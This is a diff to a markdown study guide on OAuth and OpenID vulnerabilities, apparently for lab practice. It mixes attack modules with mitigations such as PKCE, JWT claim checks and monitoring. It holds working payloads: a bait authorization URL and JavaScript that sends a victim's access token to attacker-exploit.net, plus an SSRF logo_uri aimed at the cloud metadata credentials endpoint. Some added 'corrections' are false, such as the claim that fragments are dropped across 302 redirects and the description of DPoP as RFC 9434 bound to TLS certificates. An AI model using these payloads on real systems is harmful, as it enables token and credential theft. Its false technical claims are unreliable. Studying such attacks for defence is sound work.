@@ -21,17 +21,34 @@ Instead of credentials, OAuth relies on a system of short-lived **access tokens*
 
 ---
 
+### Key OAuth Flow Types (Study Note)
+| Flow Type | Token Location | Security | Recommended For |
+|-----------|----------------|----------|-----------------|
+| Authorization Code | Backend (HTTP body) | High | Server-side apps |
+| Authorization Code + PKCE | Browser (with challenge) | High | SPAs (modern) |
+| Implicit | Browser (fragment) | Low | **DEPRECATED** |
+| Client Credentials | Backend | High | Machine-to-machine |
+
+---
+
 
 #### Low-Level Architectural Mechanics
-The vulnerability relies on a weak string-matching logic on the Authorization Server. Instead of validating the exact `redirect_uri` string, the server only checks if the incoming path **starts with** an allowed prefix. 
+The vulnerability relies on a weak string-matching logic on the Authorization Server or client redirect validation. Instead of validating the exact `redirect_uri` string, the server only checks if the incoming path **starts with** an allowed prefix. 
 
-By design, during an OAuth **Implicit Grant Flow** (`response_type=token`), the authorization token is appended to the redirect URL inside a fragment identifier (`#access_token=...`). Unlike query parameters (`?`), when a browser processes an HTTP 302 redirect, it carries the URL hash fragment along across multiple redirection hops automatically. 
+By design, during an OAuth **Implicit Grant Flow** (`response_type=token`), the authorization token is appended to the redirect URL inside a fragment identifier (`#access_token=...`). Unlike query parameters (`?`), URL fragments are **NOT sent to the server** but are accessible to client-side JavaScript. This creates a client-side exfiltration vector when combined with open redirect bugs.
 
-The attacker injects a path traversal payload (`/../`). The browser resolves this shortcut in memory *before* loading the page, canceling out the valid directory and dropping execution straight into a client-side open redirect parameter.
+**Important Technical Correction**: Modern browsers (Chrome, Firefox, Safari) **DO NOT preserve fragments across server-side 302 redirects**. The attack works via **client-side redirect chain** (`window.location`), not server-side redirects.
+
+The attacker exploits:
+1. Authorization Server accepts `redirect_uri` with path traversal
+2. Browser normalizes the path (removes `/../`)
+3. Client application has an open redirect at `/post/next?path=...`
+4. Token in fragment is passed to the open redirect endpoint
+5. Client-side JS extracts fragment and redirects to attacker
 
 #### Typology A: Path Traversal Whitelist Bypass (`/../`)
 *   **Allowed Path**: `https://vulnerable-client.com`
-*   **Target Open Redirect Endpoint**: `https://vulnerable-client.com...`
+*   **Target Open Redirect Endpoint**: `https://vulnerable-client.com/...`
 
 #### 🎯 Raw Injection Payload
 ```text
@@ -40,7 +57,7 @@ The attacker injects a path traversal payload (`/../`). The browser resolves thi
 
 #### 🌐 Full Intercepted Bait URL (Sent to Victim)
 ```text
-https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.com../post/next?path=https://attacker-exploit.net&response_type=token&nonce=1337&scope=openid%20profile%20email
+https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.com/../post/next?path=https://attacker-exploit.net&response_type=token&nonce=1337&scope=openid%20profile%20email
 ```
 
 #### Typology B: Parameter Confusion / Pollution
@@ -65,7 +82,7 @@ if (!document.location.hash) {
     /* PHASE 1: First Visit (No Hash Present)
        The victim arrives clean. The script forcefully triggers the malicious 
        OAuth redirection chain using the Path Traversal bypass. */
-    window.location = 'https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.com../post/next?path=https://attacker-exploit.net&response_type=token&nonce=1337&scope=openid%20profile%20email';
+    window.location = 'https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.com/../post/next?path=https://attacker-exploit.net&response_type=token&nonce=1337&scope=openid%20profile%20email';
 } else {
     /* PHASE 2: Return Visit (Hash Token Present)
        The victim bounces back from the client's open redirect with the token.
@@ -80,6 +97,16 @@ if (!document.location.hash) {
 ```text
 192.168.1.45 - - [19/Jun/2026:23:14:02 +0000] "GET /?access_token=eyJhbGciOiJSUzI1NiIsImtpZCI6...&expires_in=3600 HTTP/1.1" 200 404 "https://vulnerable-client.com"
 ```
+
+#### Modern Mitigation: PKCE (Proof Key for Code Exchange)
+- **Purpose**: Prevents authorization code interception attacks for SPAs
+- **Mechanism**: Client generates `code_challenge` (SHA256 hash) and `code_verifier` (random string)
+- **Flow**:
+  1. Client sends `code_challenge` during authorization request (`response_type=code`)
+  2. Authorization server stores challenge
+  3. At `/token` exchange, client sends `code_verifier`
+  4. Server validates verifier hash matches stored challenge
+- **Effect**: Attacker cannot use intercepted authorization code without original `code_verifier`
 
 ---
 
@@ -129,6 +156,14 @@ Connection: close
 ```
 *   **Result**: The server processes the request, fails to check if the attached token actually belongs to `carlos`, and returns a `302 Found` response assigning an authenticated session cookie belonging directly to the victim.
 
+#### Backend Should Verify These JWT Claims:
+- Token **signature** (JWT cryptographic verification)
+- `iss` (issuer) matches expected IdP
+- `aud` (audience) matches your app client ID
+- `exp` (expiration) not expired
+- `sub` (subject) matches submitted user ID
+- `email_verified` = true (if using email for account mapping)
+
 ---
 
 ### Module 03: Flawed CSRF Protection (Missing or Weak `state`)
@@ -162,6 +197,8 @@ Connection: close
 ```
 *   **Result**: When the logged-in victim loads this HTML, their browser triggers the attacker's authorization code against the client backend. Because no unique session `state` token is cross-checked, the client backend binds the attacker's social media identity to the victim's profile account.
 
+**Note**: For SPAs, PKCE provides similar CSRF protection without requiring server-side state storage.
+
 ---
 
 ## 🔬 2. OAuth Service Provider Vulnerabilities
@@ -194,6 +231,8 @@ Connection: close
 ---
 
 ### Module 05: Flawed Scope Validation & Token Privilege Escalation
+*   **CWE Mapping**: CWE-20, CWE-287
+*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control
 
 #### Typology A: Authorization Code Scope Upgrade
 Occurs when an attacker registers an application with the OAuth service and requests a low-risk scope (e.g., `email`). Once the victim approves the consent screen, the attacker intercepts the code/token exchange request at the `/token` phase and appends unauthorized scopes.
@@ -238,10 +277,15 @@ Authorization: Bearer STOLEN_LOW_PRIVILEGE_TOKEN
 Connection: close
 ```
 
+#### Mitigation: Refresh Token Rotation
+- **What**: Each refresh token use issues NEW refresh token
+- **Old token**: Immediately invalidated
+- **Effect**: If attacker steals refresh token, legitimate user's next use detects reuse → both tokens invalidated
+
 ---
 
 ### Module 06: Unverified User Registration
-*   **CWE Mapping**: CWE-287 (Improper Authentication) [CWE-287]
+*   **CWE Mapping**: CWE-287 (Improper Authentication)
 *   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures
 
 #### Low-Level Architectural Mechanics
@@ -281,10 +325,12 @@ Content-Type: text/html
 
 > **Why it breaks**: The client application backend parses the token, identifies the matching `email` field string in its database, and grants complete session control to the attacker while failing to process or reject based on the `"email_verified": false` validation flag.
 
+**Critical**: Map accounts by `iss` + `sub` (immutable), NOT by mutable `email`.
+
 ---
 
 ### Module 07: SSRF via OpenID Dynamic Client Registration
-*   **CWE Mapping**: CWE-918 (Server-Side Request Forgery) [CWE-918]
+*   **CWE Mapping**: CWE-918 (Server-Side Request Forgery)
 *   **OWASP Top 10 Reference**: A10:2021-Server-Side Request Forgery
 
 #### Low-Level Architectural Mechanics
@@ -292,7 +338,7 @@ OpenID Connect specifications allow dynamic client registration via a dedicated 
 
 #### 🎯 Exploitation Injection Payload
 ```json
-"logo_uri": "http://169.254.169"
+"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 ```
 
 #### 🌐 Full Intercepted Registration Request (`POST /register`)
@@ -304,7 +350,7 @@ Content-Type: application/json
 {
     "client_name": "Exploit App",
     "redirect_uris": ["https://attacker.net"],
-    "logo_uri": "http://169.254.169"
+    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 }
 ```
 
@@ -387,14 +433,41 @@ def secure_login():
         # Cryptographically decode and verify public JWKS key signatures
         decoded_claims = jwt.decode(id_token, PROVIDER_PUBLIC_KEY, algorithms=["RS256"], audience="our_app")
         
+        # 3. Validate ALL JWT claims (not just email_verified)
+        required_claims = {
+            'iss': 'https://expected-idp.com',
+            'aud': 'your-app-client-id',
+            'exp': None,  # Will be validated by jwt.decode
+        }
+        
+        for claim, expected in required_claims.items():
+            if expected and decoded_claims.get(claim) != expected:
+                return abort(401, f"Invalid {claim} claim")
+        
         # Enforce Email Verification Checks
         if not decoded_claims.get('email_verified', False):
             return abort(401, "Unverified Identity Claims Blocked")
             
-        # Establish session explicitly from cryptographically secure claims
+        # 4. Bind session to token's sub (immutable), not email (mutable)
+        session['user_sub'] = decoded_claims.get('sub')
         session['user_email'] = decoded_claims.get('email')
         return "Authenticated", 200
         
     except jwt.exceptions.InvalidTokenError:
         return abort(401, "Signature Verification Failure")
 ```
+
+### Additional Mitigations: Token Binding / DPoP
+
+**DPoP (RFC 9434)**: Demonstrating Proof of Possession
+- Tokens bound to specific TLS client certificate
+- Attacker cannot use stolen token without original client's certificate
+
+**mTLS**: Mutual TLS binds token to client certificate
+
+### Monitoring for OAuth Attacks
+- **Log**: All redirect_uri parameters (detect open redirect attempts)
+- **Alert**: Multiple different redirect_uris from same client_id
+- **Alert**: Sudden scope changes in /token requests
+- **Alert**: High failure rate on JWT signature verification
+- **Alert**: WebFinger endpoint called >100 times/hour from same IP
